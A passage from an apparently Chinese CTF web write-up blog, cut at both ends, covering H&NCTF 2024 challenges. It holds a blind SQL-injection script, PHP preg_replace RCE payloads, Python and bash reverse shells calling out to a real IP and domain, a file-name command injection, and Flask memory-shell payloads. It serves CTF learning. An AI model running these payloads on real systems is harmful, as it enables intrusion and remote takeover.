class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5_hash</span>(<span class="params">input_string</span>):</span><br><span class="line">    md5 = hashlib.md5()</span><br><span class="line">    md5.update(input_string.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> md5.hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://challenge.qsnctf.com:30230/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">EncodeToken</span>(<span class="params">original_string</span>):</span><br><span class="line">    base64_encoded = base64.b64encode(original_string.encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    hex_string = base64_encoded.encode(<span class="string">&#x27;utf-8&#x27;</span>).<span class="built_in">hex</span>()</span><br><span class="line">    <span class="keyword">return</span> hex_string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DecodeToken</span>(<span class="params">hex_str</span>):</span><br><span class="line">    b64_str = <span class="built_in">bytes</span>.fromhex(hex_str)</span><br><span class="line">    token_str = base64.b64decode(b64_str)</span><br><span class="line">    <span class="keyword">return</span> token_str.decode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Register</span>(<span class="params">username, password</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: username,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: password</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.post(url=url+<span class="string">&#x27;register.php&#x27;</span>, data=data)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Login</span>(<span class="params">username, password</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: username,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: password</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.post(url=url+<span class="string">&#x27;login.php&#x27;</span>, data=data, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">return</span> res.headers[<span class="string">&#x27;Set-Cookie&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># res = Register(username=username, password=password)</span></span><br><span class="line"><span class="comment"># print(res.text)</span></span><br><span class="line"><span class="comment"># token = Login(username, password)[6:]</span></span><br><span class="line"><span class="comment"># token = DecodeToken(token)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># token_json = json.loads(token)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SendReq</span>(<span class="params">username</span>):</span><br><span class="line"></span><br><span class="line">    token_json = &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    token_json[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">    user_hash = md5_hash(username)</span><br><span class="line">    token_json[<span class="string">&#x27;token&#x27;</span>] = user_hash</span><br><span class="line">    token_json[<span class="string">&#x27;is_admin&#x27;</span>] = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    token_str = json.dumps(token_json)</span><br><span class="line">    TOKEN = EncodeToken(token_str)</span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;TOKEN=&#x27;</span> + TOKEN</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.get(url=url+<span class="string">&#x27;home.php&#x27;</span>, headers=headers)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># sql = &#x27;database()&#x27;</span></span><br><span class="line"><span class="comment"># # dkctf  </span></span><br><span class="line"><span class="comment"># sql = &#x27;version()&#x27;</span></span><br><span class="line"><span class="comment"># # 10.5.23-MariaDB-0+deb11u1</span></span><br><span class="line"></span><br><span class="line">sql = <span class="string">&quot;select (table_name) from information_schema.tables where table_schema=database() limit 1,1&quot;</span></span><br><span class="line"><span class="comment"># user  secret</span></span><br><span class="line">sql = <span class="string">&quot;select (column_name) from information_schema.columns where table_name=&#x27;secret&#x27; limit 1,1&quot;</span></span><br><span class="line"><span class="comment"># flag sseeccrreett</span></span><br><span class="line">sql = <span class="string">&quot;select (sseeccrreett) from secret&quot;</span></span><br><span class="line"><span class="comment">#  # DRKCTF&#123;8b31c3a2f57b4de68124ac7734734944&#125;</span></span><br><span class="line"></span><br><span class="line">sql = sql.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;/**/&#x27;</span>)</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">username =<span class="string">&quot;&#x27;or/**/ascii(substr(database(),1,1))=1#&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">    asc = <span class="number">32</span></span><br><span class="line">    <span class="keyword">while</span>(asc &lt; <span class="number">128</span>):</span><br><span class="line">        payload = <span class="string">&quot;&#x27;or/**/ascii(substr((&quot;</span> + sql + <span class="string">&quot;),&#123;&#125;,1))=&#123;&#125;#&quot;</span></span><br><span class="line">       <span class="comment"># print(payload.format(k, asc))</span></span><br><span class="line">        res = SendReq(payload.<span class="built_in">format</span>(k, asc))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Hacker!!&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Hacker!!&#x27;</span>)</span><br><span class="line">            exit</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;No user found&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            asc = asc + <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;@q^4*!z8a9-%42z.s~&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag = flag + <span class="built_in">chr</span>(asc)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line">            exit</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res.text[-<span class="number">200</span>:])</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>H&amp;NCTF 2024 Web</title>
      <link href="/2024/05/30/H-NCTF-2024-Web/"/>
      <url>/2024/05/30/H-NCTF-2024-Web/</url>
      
        <content type="html"><![CDATA[<h1 id="H-NCTF-2024-WEB-复现"><a href="#H-NCTF-2024-WEB-复现" class="headerlink" title="H&amp;NCTF 2024 WEB 复现"></a>H&amp;NCTF 2024 WEB 复现</h1><p>赛中只解出两题, 其他的wp都还能看懂差不多, 这里复现一下</p><h2 id="Please-RCE-Me"><a href="#Please-RCE-Me" class="headerlink" title="Please_RCE_Me"></a>Please_RCE_Me</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;moran&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;task&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$str1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;task&#x27;</span>];</span><br><span class="line">        <span class="variable">$str2</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|eval|assert|call|create|preg|sort|&#123;|&#125;|filter|exec|passthru|proc|open|echo|`| |\.|include|require|flag/i&#x27;</span>,<span class="variable">$str1</span>) || <span class="title function_ invoke__">strlen</span>(<span class="variable">$str2</span>) != <span class="number">19</span> || <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/please_give_me_flag/&#x27;</span>,<span class="variable">$str2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/please_give_me_flag/ei&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;task&#x27;</span>],<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;moran want a flag.&lt;/br&gt;(?moran=flag)&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>preg_match(&#39;/please_give_me_flag/&#39;,$str2)</code>这里不忽略大小写, 后面忽略大小写, 故绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://hnctf.imxbt.cn:46810/?moran=flag&amp;e=assert&amp;pass=system(&#x27;cat /flag&#x27;);</span><br><span class="line"></span><br><span class="line">flag=please_give_me_flaG&amp;task=register_shutdown_function($_REQUEST[&#x27;e&#x27;],$_REQUEST[&#x27;pass&#x27;])</span><br></pre></td></tr></table></figure><h2 id="ezFlask"><a href="#ezFlask" class="headerlink" title="ezFlask"></a>ezFlask</h2><p>比较抽象的一题, 这里非预期解出来了, </p><p>一开始想到的就是dns外带并且也可以成功, 但是这个容器太抽象了, 执行一次就得重开</p><p>下面说说我的方法,</p><p>首先我们知道这里禁用了很多命令</p><p>由于容器比较奇葩, fuzz的成本太高了, 这里只fuzz出来curl命令是可以执行的, 并且<code>$ </code> <code>|</code>这两个符号也是可以用的,所以我们的思路就是把远端的恶意shell命令curl下来通过管道放进<code>$0</code>,也就是放进当前执行的脚本(bash), 达到反弹shell的目的</p><p>首先vps起一个服务, 用来返回python反弹shell脚本 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;107.148.75.202&quot;,7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27; &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>之后nc监听 7777端口</p><p>发送执行curl命令的payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(&quot;os&quot;).popen(&quot;curl www.n4c1.top:5000/ |$0&quot;).read()</span><br></pre></td></tr></table></figure><p>这样我们就可以的到shell, 然后就是读源码拿flag</p><p>看正解是python内存马, 之前好像接触过一次, 没什么印象, 学习了</p><p><a href="https://www.cnblogs.com/gxngxngxn/p/18181936">https://www.cnblogs.com/gxngxngxn/p/18181936</a></p><p>大概就是通过eval的任意代码执行, 为flask当前app添加一条路由, 并将其与恶意操作函数绑定, 与Java的tomcat内存马相似, 此操作无文件落地, 通过修改中间件来获取shell</p><p>网上可以搜到很多payload</p><p>这里列出两条师傅们wp里的payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">app.add_url_rule(&#x27;/shell&#x27;,&#x27;shell&#x27;,lambda:__import__(&#x27;os&#x27;).popen(&quot;cat</span><br><span class="line">/flag&quot;).read())</span><br><span class="line"></span><br><span class="line">x cmd=render_template_string(&quot;&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](\&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;myshell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;)).read())\&quot;,&#123;&#x27;_request_ctx_stack&#x27;:url_for.__globals__[&#x27;_request_ctx_stack&#x27;],&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;&quot;)</span><br></pre></td></tr></table></figure><p>之后访问我们添加的shell路由即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/shell</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line">/shell?cmd=cat%20/flag</span><br></pre></td></tr></table></figure><h2 id="GoJava"><a href="#GoJava" class="headerlink" title="GoJava"></a>GoJava</h2><p>robots.txt中泄露了网站源码的备份</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;io&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;mime/multipart&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"><span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> blacklistChars = []<span class="type">rune</span>&#123;<span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// 设置路由</span></span><br><span class="line">http.HandleFunc(<span class="string">&quot;/gojava&quot;</span>, compileJava)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置静态文件服务器</span></span><br><span class="line">fs := http.FileServer(http.Dir(<span class="string">&quot;.&quot;</span>))</span><br><span class="line">http.Handle(<span class="string">&quot;/&quot;</span>, fs)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 启动服务器</span></span><br><span class="line">log.Println(<span class="string">&quot;Server started on :80&quot;</span>)</span><br><span class="line">log.Fatal(http.ListenAndServe(<span class="string">&quot;:80&quot;</span>, <span class="literal">nil</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">isFilenameBlacklisted</span><span class="params">(filename <span class="type">string</span>)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line"><span class="keyword">for</span> _, char := <span class="keyword">range</span> filename &#123;</span><br><span class="line"><span class="keyword">for</span> _, blackChar := <span class="keyword">range</span> blacklistChars &#123;</span><br><span class="line"><span class="keyword">if</span> char == blackChar &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">compileJava</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line"><span class="comment">// 检查请求方法是否为POST</span></span><br><span class="line"><span class="keyword">if</span> r.Method != http.MethodPost &#123;</span><br><span class="line">http.Error(w, <span class="string">&quot;Method not allowed&quot;</span>, http.StatusMethodNotAllowed)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解析multipart/form-data格式的表单数据</span></span><br><span class="line">err := r.ParseMultipartForm(<span class="number">10</span> &lt;&lt; <span class="number">20</span>) <span class="comment">// 设置最大文件大小为10MB</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(w, <span class="string">&quot;Error parsing form&quot;</span>, http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从表单中获取上传的文件</span></span><br><span class="line">file, handler, err := r.FormFile(<span class="string">&quot;file&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(w, <span class="string">&quot;Error retrieving file&quot;</span>, http.StatusBadRequest)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> file.Close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> isFilenameBlacklisted(handler.Filename) &#123;</span><br><span class="line">http.Error(w, <span class="string">&quot;Invalid filename: contains blacklisted character&quot;</span>, http.StatusBadRequest)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> !strings.HasSuffix(handler.Filename, <span class="string">&quot;.java&quot;</span>) &#123;</span><br><span class="line">http.Error(w, <span class="string">&quot;Invalid file format, please select a .java file&quot;</span>, http.StatusBadRequest)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">err = saveFile(file, <span class="string">&quot;./upload/&quot;</span>+handler.Filename)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(w, <span class="string">&quot;Error saving file&quot;</span>, http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">saveFile</span><span class="params">(file multipart.File, filePath <span class="type">string</span>)</span></span> <span class="type">error</span> &#123;</span><br><span class="line"><span class="comment">// 创建目标文件</span></span><br><span class="line">f, err := os.Create(filePath)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> f.Close()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将上传的文件内容复制到目标文件中</span></span><br><span class="line">_, err = io.Copy(f, file)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里不用细看, 基本上就能猜到使用相同命令javac + 文件名 这种形式来编译上传的文件, 那么既然是系统命令, 就可以通过上传的 文件名进行命令注入</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240514130817384.png" alt="image-20240514130817384"></p><p>可以看见确实如此, 但是这里是一个gojava的低权限用户, 想办法弹shell提权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=&quot;1;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDcuMTQ4Ljc1LjIwMi83Nzc3IDA+JjE=| base64 -d |bash;Main.java&quot;</span><br></pre></td></tr></table></figure><p>根目录下有一个很特殊的文件</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240514131921586.png" alt="image-20240514131921586"></p><p>这里面的内容就算是root的密码</p><p>直接su root, 然后运行&#x2F;start.sh即可, flag在root目录下</p><h2 id="flipPin"><a href="#flipPin" class="headerlink" title="flipPin"></a>flipPin</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, abort</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, Response</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode, b64decode</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">default_session = <span class="string">&#x27;&#123;&quot;admin&quot;: 0, &quot;username&quot;: &quot;user1&quot;&#125;&#x27;</span></span><br><span class="line">key = get_random_bytes(AES.block_size)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">session</span>):</span><br><span class="line">    iv = get_random_bytes(AES.block_size)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    <span class="keyword">return</span> b64encode(iv + cipher.encrypt(pad(session.encode(<span class="string">&#x27;utf-8&#x27;</span>), AES.block_size)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">session</span>):</span><br><span class="line">    raw = b64decode(session)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, raw[:AES.block_size])</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = unpad(cipher.decrypt(raw[AES.block_size:]), AES.block_size).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">filename_blacklist = &#123;</span><br><span class="line">    <span class="string">&#x27;self&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;cgroup&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;mountinfo&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;env&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span 